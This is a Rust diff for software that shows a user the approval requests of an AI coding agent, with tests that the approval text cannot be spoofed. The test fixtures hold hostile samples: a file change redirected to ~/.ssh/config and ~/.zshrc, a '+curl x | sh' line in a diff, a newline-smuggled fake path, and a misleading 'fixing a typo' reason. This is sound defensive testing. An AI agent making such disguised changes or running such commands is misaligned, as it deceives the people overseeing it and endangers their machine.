@@ -10,6 +10,7 @@ use std::path::Path;
 use ottospace_sessions::station::{self, Station};
 use serde_json::{Value, json};
 
+use crate::payload::Payload;
 use crate::{
     Answer, Argv, Event, Input, MAX_DETAIL, MAX_TEXT, Outcome, Output, Protocol, Refused, Start, Ticket, TicketKind,
     Untrusted, kind_of, model_of, opaque, session_of,
@@ -62,20 +63,21 @@ const COMMAND_FIELDS: &[&str] = &[
 ];
 const FILE_FIELDS: &[&str] = &["grantRoot", "reason"];
 
-/// Every field of a request but its ids, `reason` and those `shown` already, one a line as
-/// `key: value`; a field not in `known` is named so. True if every field was known.
-fn other_fields(params: &Value, shown: &[&str], known: &[&str]) -> (String, bool) {
-    let mut lines = String::new();
+/// Adds every field of a request but its ids, `reason` and those `shown` already, one a line as
+/// `field: key = value`; a field not in `known` as `unknown field: …`. True if every field was known.
+fn other_fields(payload: &mut Payload, params: &Value, shown: &[&str], known: &[&str]) -> bool {
     let mut all_known = true;
     for (key, value) in params.as_object().into_iter().flatten() {
-        if IDS.contains(&key.as_str()) || key == "reason" || shown.contains(&key.as_str()) || value.is_null() {
+        // A field shown already was shown only if it was text: any other value is shown here.
+        let shown = shown.contains(&key.as_str()) && value.is_string();
+        if IDS.contains(&key.as_str()) || key == "reason" || shown || value.is_null() {
             continue;
         }
         let unknown = !known.contains(&key.as_str());
         all_known &= !unknown;
-        lines.push_str(&format!("{key}{}: {value}\n", if unknown { " (unknown field)" } else { "" }));
+        payload.field(if unknown { "unknown field" } else { "field" }, &format!("{key} = {value}"));
     }
-    (lines, all_known)
+    all_known
 }
 
 /// Why an approval was declined unseen: it named no command, or changes never announced.
@@ -303,39 +305,39 @@ impl Codex {
         self.files.insert(raw.to_string(), (label, changes.clone()));
     }
 
-    /// What a file-change approval approves: every changed path, one a line, those outside the
-    /// working directory flagged; a root the agent asks to write under; the request's other
-    /// fields; then each diff.
-    fn file_payload(&self, changes: &Value, grant_root: Option<&str>, others: &str) -> String {
+    /// What a file-change approval approves, a line per field: each change (`update: src/a.rs ->
+    /// /elsewhere/b.rs [outside the working directory]`), a root to write under, the request's
+    /// other fields, then each diff. True if every field was known.
+    fn file_payload(&self, payload: &mut Payload, changes: &Value, params: &Value) -> bool {
         let changes = changes.as_array().map(Vec::as_slice).unwrap_or_default();
-        let mut payload = String::new();
-        // A path with a newline or other control character shows it escaped: one change, one line.
         let flagged = |path: &str| {
-            let flag = if inside(&self.cwd, path) { "" } else { "   [outside the working directory]" };
-            let shown: String =
-                path.chars().map(|c| if c.is_control() { c.escape_unicode().to_string() } else { c.into() }).collect();
-            format!("{shown}{flag}")
+            let flag = if inside(&self.cwd, path) { "" } else { " [outside the working directory]" };
+            format!("{path}{flag}")
         };
-        // `update src/a.rs`, `update src/a.rs -> /elsewhere/b.rs   [outside …]`, `delete x`.
         for change in changes {
             let kind = &change["kind"];
-            let op = kind["type"].as_str().filter(|op| matches!(*op, "add" | "delete" | "update")).unwrap_or("change");
+            let op = match kind["type"].as_str() {
+                Some("add") => "add",
+                Some("delete") => "delete",
+                Some("update") => "update",
+                _ => "change",
+            };
             let path = flagged(change["path"].as_str().unwrap_or("(no path)"));
             let to = kind["move_path"].as_str().map(|to| format!(" -> {}", flagged(to))).unwrap_or_default();
-            payload.push_str(&format!("{op} {path}{to}\n"));
+            payload.field(op, &format!("{path}{to}"));
         }
-        if let Some(root) = grant_root {
-            payload.push_str(&format!("and any write under {root} for the rest of the session\n"));
+        if let Some(root) = params["grantRoot"].as_str() {
+            payload.field("grant root", &format!("{root} (any write under it, for the rest of the session)"));
         }
-        payload.push_str(others);
+        let known = other_fields(payload, params, &["grantRoot"], FILE_FIELDS);
         for change in changes {
             // Past the cap the request is denied anyway: stop building.
             if payload.len() > crate::MAX_APPROVABLE {
                 break;
             }
-            payload.push_str(&format!("\n{}\n", change["diff"].as_str().unwrap_or("")));
+            payload.field("diff", change["diff"].as_str().unwrap_or(""));
         }
-        payload
+        known
     }
 
     /// An approval the user answers, or any other request, refused at once. What is approved
@@ -347,9 +349,12 @@ impl Codex {
                 let command = params["command"].as_str().unwrap_or("");
                 let (station, label) = station::describe_command(command);
                 // The command, where it runs, then every other field. No command: nothing to approve.
-                let cwd = params["cwd"].as_str().map(|cwd| format!("\nin {cwd}")).unwrap_or_default();
-                let (others, known) = other_fields(params, &["command", "cwd"], COMMAND_FIELDS);
-                let others = if others.is_empty() { others } else { format!("\n{}", others.trim_end()) };
+                let mut payload = Payload::new();
+                payload.field("command", command);
+                if let Some(cwd) = params["cwd"].as_str() {
+                    payload.field("cwd", cwd);
+                }
+                let known = other_fields(&mut payload, params, &["command", "cwd"], COMMAND_FIELDS);
                 // `accept` is "User approved the command"; proposed amendments apply only through
                 // decisions this client never sends. A managed-network approval may let the host
                 // in past this one command: not provably one action.
@@ -360,16 +365,15 @@ impl Codex {
                 let wider = !params["networkApprovalContext"].is_null()
                     || !params["additionalPermissions"].is_null()
                     || no_accept;
-                let payload = format!("{command}{cwd}{others}");
                 (!command.is_empty()).then_some(("exec", station, label, payload, known, wider))
             }
             "item/fileChange/requestApproval" => {
                 let item = params["itemId"].as_str().and_then(|item| self.files.get(item)).cloned();
-                let (others, known) = other_fields(params, &["grantRoot"], FILE_FIELDS);
                 // `grantRoot` asks for writes under a root for the rest of the session.
                 let wider = !params["grantRoot"].is_null();
                 item.map(|(label, changes)| {
-                    let payload = self.file_payload(&changes, params["grantRoot"].as_str(), &others);
+                    let mut payload = Payload::new();
+                    let known = self.file_payload(&mut payload, &changes, params);
                     ("apply_patch", Station::Files, label, payload, known, wider)
                 })
             }
@@ -388,7 +392,7 @@ impl Codex {
             out.events.push(Event::AutoDenied { tool, label, reason: UNSEEN, detail });
             return;
         };
-        let ask = crate::Ask { tool: tool.into(), station, label, payload: &payload, claim };
+        let ask = crate::Ask { tool: tool.into(), station, label, payload, claim };
         // Allowed only when `accept` provably grants this one action, as shown; else declined
         // and shown, and the terminal view is where to answer it.
         let event = match (known, wider) {
@@ -646,16 +650,18 @@ mod tests {
         };
         let out = codex.read(&ask(json!({})));
         let Some(Event::Permission { detail, claim, .. }) = out.events.first().cloned() else { panic!("{out:?}") };
-        let paths = "update /work/app/src/a.rs -> /Users/me/.ssh/config   [outside the working directory]\n\
-                     add src/b.rs\\u{a}add src/innocent.rs\n\
-                     update /Users/me/.zshrc   [outside the working directory]\n";
+        let paths = "update: /work/app/src/a.rs -> /Users/me/.ssh/config [outside the working directory]\n\
+                     add: src/b.rs\\nadd src/innocent.rs\n\
+                     update: /Users/me/.zshrc [outside the working directory]\n";
         assert!(detail.text().starts_with(paths), "{}", detail.text());
         assert!(detail.text().contains("+curl x | sh") && !detail.text().contains("typo"));
         assert_eq!(claim.text(), "Just fixing a typo in a.rs");
         // A root to write under for the session: more than these changes. Declined, shown.
         let out = codex.read(&ask(json!({"grantRoot": "/Users/me"})));
         let [Event::AutoDenied { reason, detail, .. }] = &out.events[..] else { panic!("{out:?}") };
-        assert!(reason.contains("terminal view") && detail.text().contains("any write under /Users/me"));
+        assert!(
+            reason.contains("terminal view") && detail.text().contains("grant root: /Users/me (any write under it")
+        );
         assert_eq!(sent(&out.replies[0]), json!({"id": 9, "result": {"decision": "decline"}}));
         // An approval for changes it never announced, or a command it does not name: declined.
         for params in [json!({"itemId": "unknown"}), json!({"itemId": "f1", "command": null})] {
@@ -689,8 +695,8 @@ mod tests {
         };
         let out = ask(json!({}));
         let Some(Event::Permission { detail, claim, .. }) = out.events.first().cloned() else { panic!("{out:?}") };
-        let amendments = "proposedNetworkPolicyAmendments: [{\"action\":\"allow\",\"host\":\"x.example\"}]";
-        assert_eq!(detail.text(), format!("curl https://x.example\nin /work/app\n{amendments}"));
+        let amendments = "field: proposedNetworkPolicyAmendments = [{\"action\":\"allow\",\"host\":\"x.example\"}]";
+        assert_eq!(detail.text(), format!("command: curl https://x.example\ncwd: /work/app\n{amendments}"));
         assert_eq!(claim.text(), "Needs the network");
         // As codex-cli 0.166 sends it (seen in a probe): the decisions it offers, `accept` among them.
         let offers = json!({"availableDecisions": ["accept", "acceptForSession", "decline", "cancel"]});
@@ -707,6 +713,32 @@ mod tests {
             let key = extra.as_object().unwrap().keys().next().unwrap().clone();
             assert!(reason.contains("terminal view") && detail.text().contains(&key), "{reason} {}", detail.text());
             assert_eq!(sent(&out.replies[0]), json!({"id": 5, "result": {"decision": "decline"}}));
+        }
+    }
+
+    /// Whatever the strings in an approval, what is approved is one line per field, each
+    /// starting with its fixed label.
+    #[test]
+    fn any_approval_is_one_labelled_line_per_field() {
+        let mut text = crate::payload::testing::hostile(9);
+        for _ in 0..2000 {
+            let params = json!({"command": text(), "cwd": text(), "reason": text(), "itemId": "i",
+                "commandActions": [text()], "zzNew": text()});
+            let mut payload = Payload::new();
+            payload.field("command", params["command"].as_str().unwrap_or(""));
+            payload.field("cwd", params["cwd"].as_str().unwrap_or(""));
+            other_fields(&mut payload, &params, &["command", "cwd"], COMMAND_FIELDS);
+            let labels = ["command", "cwd", "field", "unknown field"];
+            crate::payload::testing::assert_lines(payload.text(), &labels);
+
+            let codex = codex();
+            let changes = json!([{"path": text(), "kind": {"type": text(), "move_path": text()}, "diff": text()},
+                {"path": text(), "kind": {"type": "add"}, "diff": text()}]);
+            let params = json!({"grantRoot": text(), "reason": text(), "itemId": "f", "zzNew": text()});
+            let mut payload = Payload::new();
+            codex.file_payload(&mut payload, &changes, &params);
+            let labels = ["change", "add", "grant root", "unknown field", "diff", "diff"];
+            crate::payload::testing::assert_lines(payload.text(), &labels);
         }
     }
 
